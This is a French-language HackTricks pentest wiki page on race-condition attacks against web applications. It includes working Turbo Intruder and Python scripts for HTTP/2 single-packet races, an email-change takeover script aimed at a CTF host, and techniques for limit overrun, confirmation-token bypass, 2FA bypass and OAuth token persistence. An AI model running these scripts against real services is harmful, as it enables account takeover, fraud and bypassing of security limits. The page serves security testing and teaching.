# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Pour obtenir une compréhension approfondie de cette technique, consultez le rapport original sur [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Améliorer les attaques de Race Condition

Le principal obstacle pour exploiter une race condition est de s'assurer que plusieurs requêtes sont traitées en même temps, avec **une différence de temps de traitement très faible — idéalement, moins de 1ms**.

Voici quelques techniques pour synchroniser les requêtes :

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2** : Permet d'envoyer deux requêtes sur une seule connexion TCP, réduisant l'impact du jitter réseau. Cependant, en raison des variations côté serveur, deux requêtes peuvent ne pas suffire pour une exploitation de race condition cohérente.
- **HTTP/1.1 'Last-Byte Sync'** : Permet de pré-envoyer la majeure partie de 20 à 30 requêtes, en retenant un petit fragment, qui est ensuite envoyé simultanément, obtenant une arrivée simultanée au serveur.

**Préparation pour Last-Byte Sync** implique :

1. Envoyer les headers et les données du body moins le dernier octet sans fermer le stream.
2. Faire une pause de 100ms après l'envoi initial.
3. Désactiver TCP_NODELAY pour utiliser l'algorithme de Nagle afin de regrouper les frames finales.
4. Envoyer un ping pour chauffer la connexion.

L'envoi ultérieur des frames retenues devrait aboutir à leur arrivée dans un seul paquet, vérifiable via Wireshark. Cette méthode ne s'applique pas aux fichiers statiques, qui ne sont généralement pas impliqués dans les RC attacks.

### S'adapter à l'architecture du serveur

Comprendre l'architecture cible est crucial. Les front-end servers peuvent router les requêtes différemment, affectant le timing. Chauffer préventivement la connexion côté serveur, via des requêtes sans conséquence, peut normaliser le timing des requêtes.

#### Gestion du verrouillage basé sur la session

Des frameworks comme le session handler de PHP sérialisent les requêtes par session, ce qui peut masquer des vulnérabilités. Utiliser des session tokens différents pour chaque requête peut contourner ce problème.

#### Contourner les limites de débit ou de ressources

Si le warming de connexion est inefficace, déclencher volontairement des délais liés aux limites de débit ou de ressources des web servers via un flood de requêtes factices peut faciliter le single-packet attack en induisant un délai côté serveur propice aux race conditions.

## Exemples d'attaques

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)** : Vous pouvez envoyer la requête vers **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), vous pouvez changer dans la requête la valeur que vous voulez brute-forcer pour **`%s`** comme dans `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` et puis sélectionner le **`examples/race-single-packer-attack.py`** dans la liste déroulante :

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Si vous allez envoyer différentes valeurs, vous pouvez modifier le code avec celui-ci qui utilise une wordlist depuis le presse-papiers:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Si le site web ne supporte pas HTTP2 (seulement HTTP1.1), utilisez `Engine.THREADED` ou `Engine.BURP` au lieu de `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Si vous devez envoyer une requête à 1 endpoint, puis plusieurs à d'autres endpoints pour déclencher le RCE, vous pouvez modifier le script `race-single-packet-attack.py` avec quelque chose comme :
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- C'est aussi disponible dans **Repeater** via la nouvelle option '**Send group in parallel**' de Burp Suite.
- Pour **limit-overrun** vous pouvez simplement ajouter la **même requête 50 fois** dans le groupe.
- Pour **connection warming**, vous pouvez **ajouter**, au **début** du **groupe**, quelques **requêtes** vers une partie non statique du serveur web.
- Pour **delaying** le processus **entre** le traitement d'**une requête et une autre** dans un processus en 2 sous-états, vous pouvez **ajouter des requêtes supplémentaires entre** les deux requêtes.
- Pour un RC **multi-endpoint** vous pouvez commencer par envoyer la **requête** qui **mène à l'état caché** puis **50 requêtes** juste après qui **exploiteront l'état caché**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Script python automatisé**: L'objectif de ce script est de changer l'email d'un utilisateur tout en le vérifiant en continu jusqu'à ce que le token de vérification du nouvel email arrive dans le dernier email (cela vient du fait que dans le code il y avait une RC où il était possible de modifier un email mais que la vérification était envoyée à l'ancien parce que la variable indiquant l'email avait déjà été initialisée avec le premier).\\
Lorsque le mot "objetivo" est trouvé dans les emails reçus, nous savons que nous avons reçu le token de vérification de l'email modifié et nous terminons l'attaque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: engine and gating notes

- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: queue many copies with `gate='race1'` (or per‑attempt gates), which withholds the tail of each request; `openGate('race1')` flushes all tails together so they arrive nearly simultaneously.
- Diagnostics: negative timestamps in Turbo Intruder indicate the server responded before the request was fully sent, proving overlap. This is expected in true races.
- Connection warming: send a ping or a few harmless requests first to stabilise timings; optionally disable `TCP_NODELAY` to encourage batching of the final frames.


### Améliorer Single Packet Attack

Dans la recherche originale, il est expliqué que cette attaque a une limite de 1 500 bytes. Cependant, dans [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), il est expliqué comment il est possible d'étendre la limitation de 1 500 bytes de la single packet attack à la **limitation de fenêtre TCP de 65 535 B en utilisant la fragmentation au niveau IP** (scinder un seul paquet en plusieurs paquets IP) et de les envoyer dans un ordre différent, ce qui empêche le réassemblage du paquet tant que tous les fragments n'ont pas atteint le serveur. Cette technique a permis au chercheur d'envoyer 10 000 requêtes en environ 166 ms.

Notez que bien que cette amélioration rende l'attaque plus fiable pour des RC nécessitant que des centaines/milliers de paquets arrivent en même temps, elle peut aussi rencontrer des limitations logicielles. Certains serveurs HTTP populaires comme Apache, Nginx et Go ont un réglage strict `SETTINGS_MAX_CONCURRENT_STREAMS` à 100, 128 et 250. Cependant, d'autres comme NodeJS et nghttp2 l'ont illimité.\
Cela signifie essentiellement qu'Apache ne considérera que 100 connexions HTTP à partir d'une seule connexion TCP (limitant cette attaque RC).

Vous pouvez trouver quelques exemples utilisant cette technique dans le repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Avant la recherche précédente, voici quelques payloads utilisés qui essayaient simplement d'envoyer les paquets aussi vite que possible pour provoquer un RC.

- **Repeater:** Voir les exemples de la section précédente.
- **Intruder**: Envoyez la **request** vers **Intruder**, réglez le **number of threads** sur **30** dans le **Options menu**, puis sélectionnez comme payload **Null payloads** et générez **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

C'est le type le plus basique de race condition où des **vulnerabilities** apparaissent dans des endroits qui **limit the number of times you can perform an action**. Par exemple utiliser le même code promo plusieurs fois dans une boutique en ligne. Un exemple très simple se trouve dans [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou dans [**this bug**](https://hackerone.com/reports/759247)**.**

Il existe de nombreuses variantes de ce type d'attaque, notamment :

- Encaisser une carte cadeau plusieurs fois
- Noter un produit plusieurs fois
- Retirer ou transférer des fonds supérieurs au solde de votre compte
- Réutiliser une même solution CAPTCHA
- Contourner une limite de taux anti-brute-force

### **Sous-états cachés**

Exploiter des race conditions complexes implique souvent de tirer parti de courtes opportunités pour interagir avec des sous-états de la machine cachés ou **unintended machine substates**. Voici comment aborder cela :

1. **Identifier les sous-états cachés potentiels**
- Commencez par repérer les endpoints qui modifient ou interagissent avec des données critiques, comme les profils utilisateur ou les processus de password reset. Concentrez-vous sur :
- **Storage** : Préférez les endpoints qui manipulent des données persistantes côté serveur plutôt que ceux traitant des données côté client.
- **Action** : Recherchez des opérations qui altèrent des données existantes, plus susceptibles de créer des conditions exploitables que celles qui ajoutent de nouvelles données.
- **Keying** : Les attaques réussies impliquent généralement des opérations basées sur le même identifiant, p.ex. username ou reset token.
2. **Effectuer des sondages initiaux**
- Testez les endpoints identifiés avec des attaques de race condition, en observant toute déviation par rapport aux résultats attendus. Des réponses inattendues ou des changements de comportement de l'application peuvent indiquer une vulnérabilité.
3. **Démontrer la vulnérabilité**
- Réduisez l'attaque au nombre minimal de requêtes nécessaires pour l'exploiter, souvent seulement deux. Cette étape peut nécessiter plusieurs tentatives ou de l'automatisation en raison du timing précis requis.

### Attaques sensibles au temps

La précision dans le timing des requêtes peut révéler des vulnérabilités, surtout lorsque des méthodes prévisibles comme les timestamps sont utilisées pour des security tokens. Par exemple, générer des password reset tokens basés sur des timestamps pourrait permettre des tokens identiques pour des requêtes simultanées.

**Pour exploiter :**

- Utilisez un timing précis, comme une attaque en un seul paquet, pour effectuer des requêtes de password reset concurrentes. Des tokens identiques indiquent une vulnérabilité.

**Exemple :**

- Demandez deux password reset tokens en même temps et comparez-les. Des tokens identiques suggèrent un défaut dans la génération des tokens.

Consultez ce [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) pour l'essayer.

## Cas pratiques de sous-états cachés

### Payer & ajouter un article

Consultez ce [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) pour voir comment **payer** dans une boutique et **ajouter un article supplémentaire** que vous **n'aurez pas besoin de payer**.

### Confirmer d'autres emails

L'idée est de **vérifier une adresse email et de la changer pour une autre en même temps** afin de déterminer si la plateforme vérifie la nouvelle adresse modifiée.

### Changer l'email vers 2 adresses email (basé sur les cookies)

Selon [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab était vulnérable à une prise de contrôle de cette manière car il pouvait **send** le **email verification token of one email to the other email**.

Consultez ce [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) pour l'essayer.

### États de base de données cachés / Confirmation Bypass

Si **2 different writes** sont utilisées pour **add** des **information** dans une **base de données**, il existe une courte période où **only the first data has been written** dans la base. Par exemple, lors de la création d'un utilisateur, le **username** et le **password** peuvent être **written**, puis le **token** pour confirmer le compte nouvellement créé est écrit. Cela signifie que pendant un petit instant le **token to confirm an account is null**.

Par conséquent, **enregistrer un compte et envoyer plusieurs requêtes avec un token vide** (`token=` or `token[]=` or any other variation) pour confirmer le compte immédiatement pourrait permettre de **confirmer un compte** dont vous ne contrôlez pas l'email.

Consultez ce [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) pour l'essayer.

### Bypass 2FA

Le pseudo-code suivant est vulnérable à une race condition car pendant un très court laps de temps la **2FA is not enforced** pendant que la session est créée :
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persistance éternelle

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Ces services vous permettent de créer une application et d'authentifier des utilisateurs que le provider a enregistrés. Pour ce faire, le **client** devra **autoriser votre application** à accéder à une partie de leurs données chez le **OAUth provider**.\
Donc, jusqu'ici c'est juste un login classique avec google/linkedin/github... où on vous affiche une page disant : "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Condition de course dans `authorization_code`

Le **problème** survient lorsque vous **l'acceptez** et que cela envoie automatiquement un **`authorization_code`** à l'application malveillante. Ensuite, cette **application abuse d'une Race Condition dans le OAUth service provider pour générer plus d'un AT/RT** (_Authentication Token/Refresh Token_) à partir du **`authorization_code`** pour votre compte. En gros, elle profite du fait que vous avez autorisé l'application à accéder à vos données pour **créer plusieurs comptes**. Ensuite, si vous **cessez d'autoriser l'application à accéder à vos données, une paire d'AT/RT sera supprimée, mais les autres resteront valides**.

#### Condition de course dans `Refresh Token`

Une fois que vous avez **obtenu un RT valide**, vous pouvez essayer **de l'abuser pour générer plusieurs AT/RT** et **même si l'utilisateur annule les permissions** pour que l'application malveillante accède à ses données, **plusieurs RT resteront valides.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallèle** to abuse **Race Conditions also in Web Sockets**.
- Avec WebSocket Turbo Intruder de Burp vous pouvez utiliser le moteur **THREADED** pour lancer plusieurs connexions WS et envoyer des payloads en parallèle. Commencez par l'exemple officiel et ajustez `config()` (nombre de threads) pour la concurrence ; cela est souvent plus fiable que d'envoyer en batch sur une seule connexion lorsque vous exploitez une Race Condition de l'état côté serveur via les handlers WS. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
